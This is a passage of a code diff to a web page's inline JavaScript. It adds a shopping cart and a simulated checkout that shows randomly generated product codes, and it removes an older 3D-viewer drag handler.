+        total += parseFloat(item.price);
+        const el = document.createElement('div');
+        el.className = 'cart-item';
+        el.innerHTML = `
+          <div class="cart-item-info">
+            <h4 class="cart-item-title">${item.name}</h4>
+            <span class="cart-item-meta">1x Cape Code</span>
+          </div>
+          <div style="display:flex; align-items:center; gap:12px;">
+            <span class="cart-item-price">$${parseFloat(item.price).toFixed(2)}</span>
+            <button class="remove-item" data-id="${item.id}" aria-label="Remove item">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M10 11v6M14 11v6"/></svg>
+            </button>
+          </div>
+        `;
+        cartItemsContainer.appendChild(el);
+      });
+    }
+
+    cartTotalEl.textContent = `$${total.toFixed(2)}`;
+  }
+
+  // Event Listeners
+  cartToggle.addEventListener('click', toggleCart);
+  closeCartBtn.addEventListener('click', closeCart);
+  cartBackdrop.addEventListener('click', closeCart);
+  checkoutBtn.addEventListener('click', openCheckout);
+  closeCheckoutBtn.addEventListener('click', closeCheckout);
+
+  // Add to cart
+  document.querySelectorAll('.add-to-cart').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      const id = e.target.dataset.id;
+      const name = e.target.dataset.name;
+      const price = e.target.dataset.price;
+      
+      // Check if already in cart
+      if (!cart.find(item => item.id === id)) {
+        cart.push({ id, name, price });
+        updateCartUI();
+        toggleCart(); // Open cart automatically
+      } else {
+        // Briefly show feedback
+        const originalText = e.target.textContent;
+        e.target.textContent = 'Already in cart';
+        setTimeout(() => e.target.textContent = originalText, 1500);
+      }
+    });
   });
 
-  /* Pause idle spin while dragging */
-  if (idleAnimation && container) {
-    let resumeTimer = null;
-    function pauseIdle() {
-      clearTimeout(resumeTimer);
-      if (idleAnimation && 'speed' in idleAnimation) idleAnimation.speed = 0;
-      if (viewer && 'autoRotate' in viewer) viewer.autoRotate = false;
+  // Remove from cart
+  cartItemsContainer.addEventListener('click', (e) => {
+    const btn = e.target.closest('.remove-item');
+    if (btn) {
+      const id = btn.dataset.id;
+      cart = cart.filter(item => item.id !== id);
+      updateCartUI();
     }
-    function resumeIdle() {
-      clearTimeout(resumeTimer);
-      resumeTimer = setTimeout(function () {
-        if (idleAnimation && 'speed' in idleAnimation) idleAnimation.speed = 0.5;
-        if (viewer && 'autoRotate' in viewer) viewer.autoRotate = true;
-      }, 1400);
+  });
+
+  // Checkout submission simulation
+  payBtn.addEventListener('click', () => {
+    const email = document.getElementById('email').value;
+    if (!email || !email.includes('@')) {
+      alert('Please enter a valid email address.');
+      return;
     }
-    container.addEventListener('pointerdown', pauseIdle);
-    container.addEventListener('pointerup', resumeIdle);
-    container.addEventListener('pointercancel', resumeIdle);
-  }
+
+    payBtn.classList.add('loading');
+    
+    // Simulate network request
+    setTimeout(() => {
+      payBtn.classList.remove('loading');
+      
+      // Generate fake codes
+      const codesContainer = document.getElementById('generated-codes');
+      codesContainer.innerHTML = '';
+      cart.forEach(item => {
+        const code = `KV-${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+        const el = document.createElement('div');
+        el.className = 'success-code';
+        el.textContent = `${item.name}: ${code}`;
+        codesContainer.appendChild(el);
+      });
+
+      // Switch UI
+      document.getElementById('step-info').classList.remove('active');
+      document.getElementById('step-success').classList.add('active');
+      
+      // Clear cart data
+      cart = [];
+      updateCartUI();
+      
+    }, 1500);
+  });
+
+  // Finish checkout
+  finishBtn.addEventListener('click', () => {
+    closeCheckout();
+  });
+
+  // Init
+  updateCartUI();
+
 })();
 </script>
 </body>
